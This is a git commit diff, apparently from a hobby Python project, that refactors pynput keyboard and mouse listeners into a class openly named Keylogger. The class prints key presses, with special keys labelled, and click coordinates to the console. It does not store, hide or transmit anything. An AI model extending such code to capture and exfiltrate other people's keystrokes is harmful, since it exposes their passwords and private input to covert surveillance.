73f66cde600fb291ec3c0fffbe022d3d66410258
JoaquinMorais <joaquinmorais2005@gmail.com>
2023-11-17 14:45:51 -0300

    añadida funcion detectar teclas epeciales

--- web.py
+++ web.py
@@ -1,68 +1,60 @@
-"""from pynput.keyboard import Listener as KeyboardListener
-from pynput.mouse import Listener as MouseListener
-import webbrowser,asyncio
-
-def on_press(key):
-    print('onepress')
-
-def on_release(key):
-    print('onrelaese')
-
-def on_click(x, y, button, pressed):
-    # Tu lógica aquí para manejar el evento de clic
-    print(f'Click en ({x}, {y}) con el botón {button}, Presionado: {pressed}')
-
-
-async def listenKeyboard():
-	with KeyboardListener(on_press=on_press,on_release=on_release) as keyboard_listener:
-	   keyboard_listener.join()
-    
-async def listenMouse():
-    with MouseListener(on_click=on_click) as mouse_listener:
-        mouse_listener.join()
-
-
-async def main():
-    # Schedule two calls *concurrently*:
-    await asyncio.gather(listenMouse(),listenKeyboard())
-
-asyncio.run(main())
-
-
-
-"""
-
-
 from pynput.keyboard import Listener as KeyboardListener
 from pynput.mouse import Listener as MouseListener
-import webbrowser
 import asyncio
+from pynput.keyboard import Key
 
-def on_press(key):
-    print(f'on_press {key}')
 
-def on_release(key):
-    print('on_release')
+class Keylogger:
+    def __init__(self):
+        self.log = ""
+    
+    def on_press(self,key):
+        special_keys = {
+            Key.enter: 'Enter',
+            Key.esc: 'Esc',
+            Key.space: 'Space',
+            Key.tab: 'Tab',
+            Key.backspace: 'Backspace',
+            Key.shift: 'Shift',
+            Key.ctrl: 'Ctrl',
+            Key.alt: 'Alt',
+            Key.cmd: 'Cmd',
+            # Agrega más teclas especiales según sea necesario
+        }
+        if key in special_keys:
+            print(f'Special Key Pressed: {special_keys[key]}')
+        else:
+            try:
+                char = key.char
+                print(f'on_press {char}')
+            except AttributeError:
+                print(f'on_press {key} type: {type(key)}')
 
-def on_click(x, y, button, pressed):
-    # Tu lógica aquí para manejar el evento de clic
-    print(f'Click en ({x}, {y}) con el botón {button}, Presionado: {pressed}')
+    def on_release(self,key):
+        pass
+        #print('on_release')
 
-async def listenKeyboard():
-    with KeyboardListener(on_press=on_press, on_release=on_release) as keyboard_listener:
-        await asyncio.Future()  # Espera indefinida para que la tarea no se complete automáticamente
+    def on_click(self,x, y, button, pressed):
+        # Tu lógica aquí para manejar el evento de clic
+        print(f'Click en ({x}, {y}) con el botón {button}, Presionado: {pressed}')
 
-async def listenMouse():
-    with MouseListener(on_click=on_click) as mouse_listener:
-        await asyncio.Future()  # Espera indefinida para que la tarea no se complete automáticamente
+    async def listenKeyboard(self):
+        with KeyboardListener(on_press=self.on_press, on_release=self.on_release) as keyboard_listener:
+            await asyncio.Future()  # Espera indefinida para que la tarea no se complete automáticamente
 
-async def main():
-    # Iniciar las tareas como objetos asyncio.Task
-    task_keyboard = asyncio.create_task(listenKeyboard())
-    task_mouse = asyncio.create_task(listenMouse())
+    async def listenMouse(self):
+        with MouseListener(on_click=self.on_click) as mouse_listener:
+            await asyncio.Future()  # Espera indefinida para que la tarea no se complete automáticamente
 
-    # Esperar que ambas tareas se completen
-    await asyncio.gather(task_keyboard, task_mouse)
+    async def main(self):
+        # Iniciar las tareas como objetos asyncio.Task
+        task_keyboard = asyncio.create_task(self.listenKeyboard())
+        task_mouse = asyncio.create_task(self.listenMouse())
+
+        # Esperar que ambas tareas se completen
+        await asyncio.gather(task_keyboard, task_mouse)
 
 # Ejecutar el bucle de eventos de asyncio
-asyncio.run(main())
+if __name__ == '__main__':
+    keylogger = Keylogger()
+    asyncio.run(keylogger.main())
